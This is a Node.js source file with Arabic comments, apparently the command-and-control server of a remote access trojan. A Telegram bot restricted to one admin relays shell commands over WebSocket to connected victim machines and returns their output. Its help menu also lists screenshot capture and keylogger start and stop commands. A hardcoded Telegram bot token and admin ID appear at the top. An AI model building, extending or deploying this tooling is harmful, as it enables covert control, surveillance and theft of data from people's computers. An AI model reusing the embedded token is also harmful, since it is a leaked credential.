// ============================================================
// استيراد المكتبات المطلوبة
// ============================================================
const express = require('express');
const WebSocket = require('ws');
const fs = require('fs');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const path = require('path');
const os = require('os');
const { v4: uuidv4 } = require('uuid');

// ============================================================
// البيانات المضمنة مباشرة (تم التحديث)
// ============================================================
const BOT_TOKEN = '8678515363:AAEP2DRBPMw3iSXsD4sROmz17T7MaOTqshg';
const ADMIN_ID = '5929009698';

// ============================================================
// التحقق من صحة البيانات
// ============================================================
if (!BOT_TOKEN || !ADMIN_ID) {
    console.error('❌ خطأ: التوكن أو معرف المشرف غير موجود');
    process.exit(1);
}

console.log('✅ تم تحميل بيانات البوت بنجاح');
console.log(`👤 معرف المشرف: ${ADMIN_ID}`);

// ============================================================
// إعداد الخادم
// ============================================================
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// إنشاء البوت
const bot = new Telegraf(BOT_TOKEN);

// ============================================================
// المتغيرات العامة
// ============================================================
const clients = new Map();
let selectedClient = '';

// ============================================================
// التحقق من صلاحيات المشرف
// ============================================================
bot.use((ctx, next) => {
    const userId = ctx.from.id.toString();
    if (userId !== ADMIN_ID) {
        ctx.reply('⛔ غير مصرح لك باستخدام هذا البوت');
        return;
    }
    next();
});

// ============================================================
// أوامر البوت
// ============================================================

// أمر البدء
bot.start((ctx) => {
    ctx.reply(
        '🚀 **لوحة التحكم عن بُعد**\n\n' +
        '✅ البوت يعمل بشكل صحيح\n' +
        `👤 معرف المشرف: ${ADMIN_ID}\n` +
        `📊 عدد العملاء المتصلين: ${clients.size}\n\n` +
        'استخدم /help لعرض الأوامر'
    );
});

// أمر المساعدة
bot.command('help', (ctx) => {
    ctx.reply(
        '📋 **الأوامر المتاحة:**\n\n' +
        '/list - عرض العملاء المتصلين\n' +
        '/select <id> - اختيار عميل\n' +
        '/cmd <أمر> - تنفيذ أمر\n' +
        '/screenshot - صورة الشاشة\n' +
        '/keylog_start - بدء التسجيل\n' +
        '/keylog_stop - إيقاف التسجيل\n' +
        '/exit - فصل العميل'
    );
});

// أمر عرض العملاء
bot.command('list', (ctx) => {
    if (clients.size === 0) {
        ctx.reply('❌ لا يوجد عملاء متصلون');
        return;
    }
    
    let msg = '👥 **العملاء المتصلون:**\n\n';
    let i = 1;
    clients.forEach((ws, id) => {
        msg += `${i}. \`${id}\`\n`;
        i++;
    });
    msg += `\nالإجمالي: ${clients.size}`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// أمر اختيار عميل
bot.command('select', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        ctx.reply('⚠️ /select <المعرف>');
        return;
    }
    
    const id = args[1];
    if (clients.has(id)) {
        selectedClient = id;
        ctx.reply(`✅ تم اختيار العميل: \`${id}\``, { parse_mode: 'Markdown' });
    } else {
        ctx.reply('❌ العميل غير موجود');
    }
});

// أمر تنفيذ أوامر
bot.command('cmd', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        ctx.reply('⚠️ /cmd <الأمر>');
        return;
    }
    
    if (!selectedClient || !clients.has(selectedClient)) {
        ctx.reply('❌ لم يتم اختيار عميل');
        return;
    }
    
    const command = args.slice(1).join(' ');
    const ws = clients.get(selectedClient);
    ws.send(JSON.stringify({ type: 'command', data: command }));
    ctx.reply(`✅ جاري التنفيذ: \`${command}\``, { parse_mode: 'Markdown' });
});

// أمر الخروج
bot.command('exit', (ctx) => {
    if (!selectedClient || !clients.has(selectedClient)) {
        ctx.reply('❌ لم يتم اختيار عميل');
        return;
    }
    
    const ws = clients.get(selectedClient);
    ws.send(JSON.stringify({ type: 'exit' }));
    ctx.reply(`✅ جاري فصل العميل ${selectedClient}`);
    selectedClient = '';
});

// ============================================================
// معالجة الرسائل النصية العادية
// ============================================================
bot.on('text', (ctx) => {
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    if (selectedClient && clients.has(selectedClient)) {
        const ws = clients.get(selectedClient);
        ws.send(JSON.stringify({ type: 'command', data: text }));
        ctx.reply(`✅ تم الإرسال إلى ${selectedClient}`);
    } else {
        ctx.reply('❌ لم يتم اختيار عميل');
    }
});

// ============================================================
// إدارة اتصالات WebSocket
// ============================================================

wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    clients.set(clientId, ws);
    console.log(`🟢 عميل جديد: ${clientId}`);
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.type === 'register') {
                ws.send(JSON.stringify({ type: 'registered', id: clientId }));
                bot.telegram.sendMessage(ADMIN_ID, `🟢 عميل جديد متصل: \`${clientId}\``, { parse_mode: 'Markdown' });
            }
            
            if (data.type === 'command_result') {
                const output = data.output || '✅ تم التنفيذ';
                bot.telegram.sendMessage(ADMIN_ID, 
                    `📊 نتيجة من ${clientId}:\n\`\`\`\n${output}\n\`\`\``, 
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (error) {
            console.error('خطأ:', error.message);
        }
    });
    
    ws.on('close', () => {
        clients.delete(clientId);
        bot.telegram.sendMessage(ADMIN_ID, `🔴 عميل قطع الاتصال: \`${clientId}\``, { parse_mode: 'Markdown' });
        console.log(`🔴 عميل قطع: ${clientId}`);
    });
});

// ============================================================
// الصفحة الرئيسية
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>خادم التحكم</title></head>
            <body style="font-family: Arial; text-align: center; padding: 50px;">
                <h1>🚀 خادم التحكم عن بُعد</h1>
                <p>✅ الحالة: يعمل</p>
                <p>👤 المشرف: ${ADMIN_ID}</p>
                <p>📊 العملاء: ${clients.size}</p>
                <hr>
                <p>📱 استخدم بوت تيليجرام للتحكم</p>
            </body>
        </html>
    `);
});

// ============================================================
// تشغيل الخادم
// ============================================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('========================================');
    console.log(`🚀 خادم التحكم يعمل على المنفذ ${PORT}`);
    console.log(`👤 معرف المشرف: ${ADMIN_ID}`);
    console.log(`📊 العملاء المتصلون: ${clients.size}`);
    console.log('========================================');
});

// ============================================================
// معالجة الأخطاء
// ============================================================
process.on('uncaughtException', (err) => {
    console.error('❌ خطأ غير متوقع:', err.message);
});

process.on('SIGINT', () => {
    console.log('🛑 جاري إيقاف الخادم...');
    process.exit(0);
});
